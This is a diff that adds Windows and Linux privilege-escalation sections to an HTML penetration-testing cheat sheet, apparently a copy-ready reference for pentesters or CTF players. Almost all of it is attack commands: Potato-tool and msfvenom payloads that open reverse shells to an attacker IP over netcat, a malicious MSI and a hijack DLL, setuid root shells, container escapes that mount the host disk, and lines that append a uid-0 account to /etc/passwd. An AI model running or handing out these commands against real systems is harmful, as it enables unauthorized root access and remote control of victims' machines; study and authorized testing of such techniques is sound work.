@@ -294,6 +294,128 @@ PrintSpoofer → https://github.com/itm4n/PrintSpoofer</pre>
       </div>
     </div>
 
+    <!-- Windows Advanced -->
+    <div class="cs-section" id="win-advanced">
+      <h2 class="cs-section-title"><span class="sec-icon">🍟</span> Windows — Potato / SeImpersonate</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Token Impersonation Toolkit (2026)</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Check token privileges</span>
+whoami /priv
+
+<span class="cm"># PrintSpoofer — Win10/Server 2016-2019</span>
+PrintSpoofer64.exe -i -c cmd
+PrintSpoofer64.exe -c "nc.exe &lt;IP&gt; 4444 -e cmd"
+
+<span class="cm"># GodPotato — Win10+/Server 2019+ (best choice 2026)</span>
+GodPotato.exe -cmd "nc.exe &lt;IP&gt; 4444 -e cmd"
+
+<span class="cm"># JuicyPotato — Win7-10, Server 2008-2016</span>
+JuicyPotato.exe -l 9999 -p C:\Windows\System32\cmd.exe -a "/c nc.exe &lt;IP&gt; 4444 -e cmd" -t t
+
+<span class="cm"># RoguePotato — Server 2019 without PrintSpoofer</span>
+RoguePotato.exe -r &lt;attacker_IP&gt; -e "cmd.exe" -l 9999
+
+<span class="cm"># Quick OS check for tool selection:</span>
+<span class="cm"># Server 2019+ / Win10 1809+ → GodPotato</span>
+<span class="cm"># Win10 / Server 2016-2019   → PrintSpoofer</span>
+<span class="cm"># Win7-10 / Server 2008-2016 → JuicyPotato</span></pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">AlwaysInstallElevated + DLL Hijacking</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Check AlwaysInstallElevated</span>
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+<span class="cm"># Generate malicious MSI</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi
+
+<span class="cm"># DLL Hijacking — find missing DLLs</span>
+<span class="cm"># Run Process Monitor on target, filter: Result=NAME NOT FOUND, Path ends with .dll</span>
+<span class="cm"># Compile malicious DLL:</span>
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f dll -o hijack.dll
+
+<span class="cm"># Unquoted Service Path</span>
+wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
+<span class="cm"># If path = C:\Program Files\Vuln App\service.exe</span>
+<span class="cm"># Place payload at: C:\Program.exe or C:\Program Files\Vuln.exe</span></pre>
+      </div>
+    </div>
+
+    <!-- Linux Advanced -->
+    <div class="cs-section" id="linux-advanced">
+      <h2 class="cs-section-title"><span class="sec-icon">🐧</span> Linux — Capabilities &amp; Container Escape</h2>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Capabilities Exploitation</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Find capabilities</span>
+getcap -r / 2>/dev/null
+
+<span class="cm"># cap_setuid (python, perl, etc.) → root</span>
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
+
+<span class="cm"># cap_net_raw (tcpdump with cap) — sniff traffic</span>
+tcpdump -i eth0 -w /tmp/capture.pcap
+
+<span class="cm"># PATH hijacking via writable path entry</span>
+find / -writable -type d 2>/dev/null
+export PATH=/tmp:$PATH
+echo '#!/bin/bash\n/bin/bash -i' > /tmp/service  <span class="cm"># if SUID binary calls 'service'</span>
+chmod +x /tmp/service</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">Docker / Container Escape</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Check if inside Docker</span>
+cat /.dockerenv && cat /proc/1/cgroup | grep docker
+
+<span class="cm"># Docker group escape — mount host FS</span>
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+<span class="cm"># Privileged container escape</span>
+fdisk -l  <span class="cm"># find host disk, e.g. /dev/sda1</span>
+mkdir /mnt/host && mount /dev/sda1 /mnt/host
+chroot /mnt/host bash
+
+<span class="cm"># Writable /etc/passwd (container)</span>
+openssl passwd -1 "hacked"
+echo 'root2:$1$...:0:0::/root:/bin/bash' >> /etc/passwd
+su root2</pre>
+      </div>
+      <div class="code-block">
+        <div class="code-block-header">
+          <span class="code-block-title">NFS no_root_squash + Writable /etc/passwd</span>
+          <button class="code-badge badge-copy" onclick="copyCode(this)">Copy</button>
+        </div>
+        <pre><span class="cm"># Find NFS shares</span>
+showmount -e &lt;IP&gt;
+
+<span class="cm"># Mount share, create SUID binary</span>
+mount -t nfs &lt;IP&gt;:/share /mnt/nfs
+cp /bin/bash /mnt/nfs/bash
+chmod +s /mnt/nfs/bash
+
+<span class="cm"># On victim — run SUID bash</span>
+/mnt/nfs/bash -p
+
+<span class="cm"># Writable /etc/passwd</span>
+openssl passwd -1 "password123"
+echo "newroot:&lt;hash&gt;:0:0:root:/root:/bin/bash" >> /etc/passwd
+su newroot</pre>
+      </div>
+    </div>
+
   </main>
 </div>
 
